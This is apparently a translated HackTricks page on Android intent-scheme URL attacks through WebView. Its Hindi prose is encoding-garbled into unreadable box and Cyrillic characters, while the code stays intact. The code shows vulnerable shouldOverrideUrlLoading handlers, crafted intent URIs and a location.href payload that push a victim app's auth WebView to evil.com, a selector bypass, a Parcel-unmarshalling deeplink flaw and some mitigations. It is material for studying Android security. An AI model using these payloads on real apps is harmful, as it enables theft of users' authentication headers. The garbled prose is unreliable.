**рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ рдХрдордЬреЛрд░реА рджреВрд╕рд░реА рд╕реБрд░рдХреНрд╖рд╛ рдХрдордЬреЛрд░рд┐рдпреЛрдВ** (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдХреНрд▓рд╛рдЗрдВрдЯ рдРрдк рдореЗрдВ рдЕрдирд┐рдпрдорд┐рдд рд▓рд┐рдВрдХ рдХреЛ WebView рдореЗрдВ рд╕реАрдзреЗ рдирд┐рд░реНрдпрд╛рдд рдХрд┐рдП рдЧрдП рдЧрддрд┐рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЦреЛрд▓рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдпрд╛ рдбреАрдкрд▓рд┐рдВрдХ рдореЗрдХреЗрдирд┐рдЬрд╝реНрдо рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ) рдФрд░ рджреВрд░рд╕реНрде рд░реВрдк рд╕реЗ, рд╕рд░реНрд╡рд░ рд╕рд╛рдЗрдб рдкрд░ рдХреНрд░реЙрд╕-рд╕рд╛рдЗрдЯ рд╕реНрдХреНрд░рд┐рдкреНрдЯрд┐рдВрдЧ рдпрд╛ рдХреНрд▓рд╛рдЗрдВрдЯ рд╕рд╛рдЗрдб рдкрд░ MitM рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рд╡рд┐рдХрд▓реНрдкрд┐рдд рдХреЛрдб рдХрд╛ рдЙрджрд╛рд╣рд░рдг
```java
public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
Uri uri = request.getUrl();
if("intent".equals(uri.getScheme())) {
startActivity(Intent.parseUri(uri.toString(), Intent.URI_INTENT_SCHEME));
return true;
}
return super.shouldOverrideUrlLoading(view, request);
}
```
рдпрд╣рд╛рдБ рдмрд╛рдд рдпрд╣ рд╣реИ рдХрд┐ `WebViewClient` рдХреА рдХрдХреНрд╖рд╛ рдХреА `shouldOverrideUrlLoading(...)` рд╡рд┐рдзрд┐ рд╣рд░ рдмрд╛рд░ WebView рдПрдХ рдирдпрд╛ рд▓рд┐рдВрдХ рд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдПрдХ рдХрд╕реНрдЯрдо рд╣реИрдВрдбрд▓рд░ рдЬреЛрдбрд╝рдиреЗ рдХрд╛ рд╡рд┐рдХрд▓реНрдк рджреЗрддрд╛ рд╣реИред

рдЗрд╕ рд╕реБрд░рдХреНрд╖рд╛ рдХреА рдХрдордЬреЛрд░реА рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣рдорд▓рд╛рд╡рд╛рд░ рдХреЛ рдПрдХ WebView рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рдЬреЛ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рддреИрдпрд╛рд░ рдХрд┐рдП рдЧрдП intent-scheme URL рдкрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рд╣реЛрддрд╛ рд╣реИред URL рдирд┐рд░реНрдорд╛рдг рдХрд╛ рдЙрджрд╛рд╣рд░рдг
```java
Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.AuthWebViewActivity");
intent.putExtra("url", "http://evil.com/");
Log.d("evil", intent.toUri(Intent.URI_INTENT_SCHEME)); // outputs "intent:#Intent;component=com.victim/.AuthWebViewActivity;S.url=http%3A%2F%2Fevil.com%2F;end"
```
рдЙрджрд╛рд╣рд░рдг рд╣рдорд▓рд╛
```java
location.href = "intent:#Intent;component=com.victim/.AuthWebViewActivity;S.url=http%3A%2F%2Fevil.com%2F;end";
```
рдпрд╣ рд╕рдВрд╕реНрдХрд░рдг рд╡рд┐рдХреБрд▓рдирд┐рдпрддрд╛ рдХреЗ рдХреНрд▓рд╛рд╕рд┐рдХ рд╕рдВрд╕реНрдХрд░рдг рдХреА рддреБрд▓рдирд╛ рдореЗрдВ рдХрдИ рдкреНрд░рддрд┐рдмрдВрдз рд╣реИрдВ:

* рдПрдореНрдмреЗрдбреЗрдб `Parcelable` рдФрд░ `Serializable` рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЛ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдореЗрдВ рдХрд╛рд╕реНрдЯ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ (рдЙрдиреНрд╣реЗрдВ рдЕрдирджреЗрдЦрд╛ рдХрд░ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛)
* `Intent.parseUri(...)` рдХреЛ рдХреЙрд▓ рдХрд░рддреЗ рд╕рдордп рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдлреНрд▓реИрдЧ `Intent.FLAG_GRANT_READ_URI_PERMISSION` рдФрд░ `Intent.FLAG_GRANT_WRITE_URI_PERMISSION` рдХреЛ **рдЕрдирджреЗрдЦрд╛** рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдкрд╛рд░реНрд╕рд░ рдХреЗрд╡рд▓ рдЙрдиреНрд╣реЗрдВ рдЫреЛрдбрд╝ рджреЗрдЧрд╛ рдЕрдЧрд░ `Intent.URI_ALLOW_UNSAFE` (`startActivity(Intent.parseUri(url, Intent.URI_INTENT_SCHEME | Intent.URI_ALLOW_UNSAFE))` рдлреНрд▓реИрдЧ рд╕реЗрдЯ рд╣реЛрддрд╛ рд╣реИ, рдЬреЛ рдмрд╣реБрдд рд╣реА рджреБрд░реНрд▓рдн рд╣реИред

рдмрд╣реБрдд рд╕рд╛рд░реЗ рдбреЗрд╡рд▓рдкрд░ рдЕрднреА рднреА WebView рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рд╛рдкреНрдд рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рдЗрдВрдЯреЗрдВрдЯреНрд╕ рдХреЗ рдкреВрд░реЗ рдлрд╝рд┐рд▓реНрдЯрд░рд┐рдВрдЧ рдХреЛ рднреВрд▓ рдЬрд╛рддреЗ рд╣реИрдВред
```java
public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
Uri uri = request.getUrl();
if("intent".equals(uri.getScheme())) {
Intent intent = Intent.parseUri(uri.toString(), Intent.URI_INTENT_SCHEME);
intent.addCategory("android.intent.category.BROWSABLE");
intent.setComponent(null);
startActivity(intent);
return true;
}
return super.shouldOverrideUrlLoading(view, request);
}
```
рдЕрдЯреИрдХрд░ рдПрдХ рд╕реЗрд▓реЗрдХреНрдЯрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ рдЧреИрд░-рдирд┐рд░реНрдпрд╛рддрд┐рдд рдХреЙрдореНрдкреЛрдиреЗрдВрдЯ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИред
```java
Intent intent = new Intent();
intent.setSelector(new Intent().setClassName("com.victim", "com.victim.AuthWebViewActivity"));
intent.putExtra("url", "http://evil.com/");
Log.d("evil", intent.toUri(Intent.URI_INTENT_SCHEME)); // "intent:#Intent;S.url=http%3A%2F%2Fevil.com%2F;SEL;component=com.victim/.AuthWebViewActivity;end"
```
рдФрд░ рдРрдк рдХреЗ рд╕реНрдкрд╖реНрдЯ рдЗрдВрдЯреЗрдВрдЯ рдХреЗ рдЦрд┐рд▓рд╛рдл рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдЫреЛрдбрд╝ рджреЗрдВред рд╣рдо рдЗрд╕рд▓рд┐рдП рд╕рд▓рд╛рд╣ рджреЗрддреЗ рд╣реИрдВ рдХрд┐ рдЖрдк рд╕реЗрд▓реЗрдХреНрдЯрд░ рдХреЛ рднреА рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд░реЗрдВред
```java
intent.addCategory("android.intent.category.BROWSABLE");
intent.setComponent(null);
intent.setSelector(null);
```
рд▓реЗрдХрд┐рди рдкреВрд░реНрдг рдлрд╝рд┐рд▓реНрдЯрд░рд┐рдВрдЧ рднреА рдкреВрд░реНрдг рд╕реБрд░рдХреНрд╖рд╛ рдХреА рдЧрд╛рд░рдВрдЯреА рдирд╣реАрдВ рджреЗрддреА рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рд╣рдорд▓рд╛рд╡рд░ рдХрд┐рд╕реА рдЧреИрд░-рдирд┐рд░реНрдпрд╛рддрд┐рдд рдЧрддрд┐рд╡рд┐рдзрд┐ рдХреЗ `intent-filter` рдХреЗ рд▓рд┐рдП рдПрдХ рдирд┐рд╣рд┐рдд рдЗрдВрдЯреЗрдВрдЯ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИред рдПрдХ рдЧрддрд┐рд╡рд┐рдзрд┐ рдШреЛрд╖рдгрд╛ рдХрд╛ рдЙрджрд╛рд╣рд░рдг:
```markup
<activity android:name=".AuthWebViewActivity" android:exported="false">
<intent-filter>
<action android:name="android.intent.action.VIEW" />
<category android:name="android.intent.category.DEFAULT" />
<data android:scheme="victim" android:host="secure_handler" />
</intent-filter>
</activity>
```

```java
webView.loadUrl(getIntent().getData().getQueryParameter("url"), getAuthHeaders());
```
рдЗрд╕рд▓рд┐рдП, рд╣рдо рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХрд░рддреЗ рд╣реИрдВ рдХрд┐ рдПрдХ рдПрдХреНрдЯрд┐рд╡рд┐рдЯреА рдХреЛ рд╢реБрд░реВ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдпрд╣ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рд╡рд╣ рдирд┐рд░реНрдпрд╛рдд рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИред

## рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдЗрдВрдЯреЗрдВрдЯ рдмрдирд╛рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ

рдХреБрдЫ рдРрдк рдбреЗрд╡рд▓рдкрд░ рдЕрдкрдиреЗ **рдЦреБрдж рдХреЗ рдЗрдВрдЯреЗрдВрдЯ рдкрд╛рд░реНрд╕рд░** рдХреЛ рд▓рд╛рдЧреВ рдХрд░рддреЗ рд╣реИрдВ (рдЕрдХреНрд╕рд░ **рдбреАрдкрд▓рд┐рдВрдХреНрд╕** рдпрд╛ рдкреБрд╢ рд╕рдВрджреЗрд╢реЛрдВ рдХреЛ рд╣реИрдВрдбрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП), рдЬрд┐рд╕рдореЗрдВ рд╡реЗ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реЗ рдЕрд▓рдЧ рдирд╣реАрдВ рд╣реЛрддреЗ рд╣реИрдВ рдпрд╛ рдлрд┐рд░ рдмрдбрд╝рд╛ рдЦрддрд░рд╛ рдкреНрд░рд╕реНрддреБрдд рдХрд░рддреЗ рд╣реИрдВ, рдХреНрдпреЛрдВрдХрд┐ рд╡реЗ **`Serializable`** рдФрд░ `Parcelable` рдСрдмреНрдЬреЗрдХреНрдЯ рдХрд╛ рд╡рд┐рд╕реНрддрд╛рд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╡реЗ рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдлреНрд▓реИрдЧ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рднреА рджреЗрддреЗ рд╣реИрдВред рд╕реБрд░рдХреНрд╖рд╛ рд╢реЛрдзрдХрд░реНрддрд╛ рдХреЛ рдЗрдВрдЯреЗрдВрдЯ рдирд┐рд░реНрдорд╛рдг рдХреЗ рдФрд░ рднреА рдЕрдиреЛрдЦреЗ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдХрд╛ рд╕рд╛рдордирд╛ рдХрд░рдирд╛ рдкрдбрд╝ рд╕рдХрддрд╛ рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ рдПрдХ рдмрд╛рдЗрдЯ рдПрд░реЗ рдХреЛ `Parcel` рдореЗрдВ рдХрд╛рд╕реНрдЯ рдХрд░рдирд╛ рдФрд░ рдлрд┐рд░ рд╕реЗ рдЙрд╕рд╕реЗ рдЗрдВрдЯреЗрдВрдЯ рдкрдврд╝рдирд╛ред
```java
Uri deeplinkUri = getIntent().getData();
if(deeplinkUri.toString().startsWith("deeplink://handle/")) {
byte[] handle = Base64.decode(deeplinkUri.getQueryParameter("param"), 0);
Parcel parcel = Parcel.obtain();
parcel.unmarshall(handle, 0, handle.length);
startActivity((Intent) parcel.readParcelable(getClassLoader()));
}
```
# Vuln app

{% embed url="https://github.com/oversecured/ovaa" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

- рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!

- рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)

- рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ рдореБрдЭреЗ **Twitter** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ [hacktricks рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks) рдФрд░ [hacktricks-cloud рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред**

</details>
